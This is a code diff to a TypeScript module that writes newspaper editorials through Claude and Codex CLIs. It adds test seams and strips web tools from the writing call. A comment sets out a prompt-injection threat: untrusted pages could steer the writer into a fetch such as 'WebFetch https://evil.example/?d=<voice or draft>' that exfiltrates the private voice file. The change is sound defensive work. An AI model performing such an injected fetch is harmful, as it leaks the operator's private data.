@@ -35,10 +35,15 @@ import { pinnedLocalModelForJob } from "./job-local-model.ts";
 
 export type { WriteEditorialInput, WriteEditorialResult } from "./editorial-orchestration.ts";
 
-/** Research supplies leads; the writer independently opens sources and files an
- * editorial with claims and sources. Both subscription writers retain web
- * research during writing. Both CLIs load the complete voice by file path,
- * never as prompt text in argv or application logs. */
+/** Research supplies leads; the writer files an editorial with claims and
+ * sources from the record research returned. The gathering pass is the only
+ * Claude call that gets the web tools (`EDITORIAL_TOOLS`); the writing call
+ * gets none, because it is the one call whose context holds the private voice
+ * file AND text gathered from untrusted pages — and an outbound fetch tool
+ * reachable from that context would let a hostile page read the voice out
+ * through a URL (SEC-3). Research is where web access belongs: it never sees
+ * the voice. Both CLIs load the complete voice by file path, never as prompt
+ * text in argv or application logs. */
 
 /**
  * Editorials take tens of minutes, not seconds. The voice researches first.
@@ -110,7 +115,18 @@ export async function ensureEditorialSchema() {
   ]);
 }
 
-export async function writeEditorial(input: WriteEditorialInput): Promise<WriteEditorialResult> {
+/** Test seams for the two subscription transports, in the same shape as
+ * `fileEditorial`'s `deps` and `performEditorialWork`'s: production passes
+ * nothing and the runtime reaches the real CLI. */
+export type EditorialWriterDeps = {
+  claudeCodeChat?: typeof claudeCodeChat;
+  codexChat?: typeof import("./ai-codex.server.ts").codexChat;
+};
+
+export async function writeEditorial(
+  input: WriteEditorialInput,
+  deps: EditorialWriterDeps = {},
+): Promise<WriteEditorialResult> {
   const cfg = await getPaperConfig(input.newsroomId);
   input = {
     ...input,
@@ -130,20 +146,21 @@ export async function writeEditorial(input: WriteEditorialInput): Promise<WriteE
   return orchestrateEditorial(input, {
     findVoiceFile,
     runClaudePair: async ({ input: editorialInput, found, researchPack }) => {
-      const { resolveClaudeCode } = await import("./ai");
+      const { resolveClaudeCode } = await import("./ai.ts");
       if (!resolveClaudeCode()) {
         return {
           ok: false,
           error: "Claude is unavailable. Open Claude Code, sign in, then try again.",
         };
       }
+      const chat = deps.claudeCodeChat ?? claudeCodeChat;
       const choice = opinionModelChoice(editorialInput.modelChoice);
       const entry = providerEntry(choice);
       if (!entry || entry.kind !== "claude-code") {
         return { ok: false, error: "The selected Claude model is unavailable." };
       }
       if (completedResearch === null) {
-        const research = await claudeCodeChat({
+        const research = await chat({
           system: RESEARCH_INSTRUCTIONS,
           user: researchPack,
           model: plannerModelFor(choice) || providerModel(entry),
@@ -156,10 +173,21 @@ export async function writeEditorial(input: WriteEditorialInput): Promise<WriteE
       }
       if (editorialInput.completion)
         await setJobStage(editorialInput.completion.jobId, "Writing the editorial");
-      return claudeCodeChat({
+      return chat({
         system: "",
         systemPromptFile: found.voice.path,
-        allowedTools: EDITORIAL_TOOLS,
+        /*
+          No tools here, and no empty allow-list either. This is the one call
+          whose context holds the operator's private voice file AND the
+          gathering pass's summary of untrusted pages, so it must have no way
+          to reach the network: a page that talked the writer into
+          `WebFetch https://evil.example/?d=<voice or draft>` would publish
+          the voice by URL. `noTools` drops the tool surface from the request
+          (`--tools ""`) rather than pre-denying a visible one, so there is
+          nothing live to try. Web access stays on the research call above,
+          which never sees the voice (SEC-3).
+        */
+        noTools: true,
         user: buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
@@ -173,7 +201,7 @@ export async function writeEditorial(input: WriteEditorialInput): Promise<WriteE
       });
     },
     runCodexPair: async ({ input: editorialInput, found, researchPack }) => {
-      const { codexChat } = await import("./ai-codex.server.ts");
+      const codexChat = deps.codexChat ?? (await import("./ai-codex.server.ts")).codexChat;
       const choice = opinionModelChoice(editorialInput.modelChoice);
       const entry = providerEntry(choice);
       if (!entry || entry.kind !== "codex") {
@@ -223,7 +251,7 @@ export async function writeEditorial(input: WriteEditorialInput): Promise<WriteE
     runLocalPair: async ({ input: editorialInput }) => {
       const voice = await readVoiceTextForLocalModel();
       if (!voice.ok) return voice;
-      const { grokChat } = await import("./ai");
+      const { grokChat } = await import("./ai.ts");
       // Same per-newsroom "which local server/model" pick every other
       // surface honours (Story, Scan, Dark Desk) -- see
       // ./provider-settings.ts's `resolveLocalModelChoice`. Failure here
@@ -259,7 +287,7 @@ export async function writeEditorial(input: WriteEditorialInput): Promise<WriteE
     runCustomPair: async ({ input: editorialInput }) => {
       const voice = await readVoiceTextForLocalModel();
       if (!voice.ok) return voice;
-      const { grokChat } = await import("./ai");
+      const { grokChat } = await import("./ai.ts");
       return grokChat(
         voice.text,
         buildWritingPack({
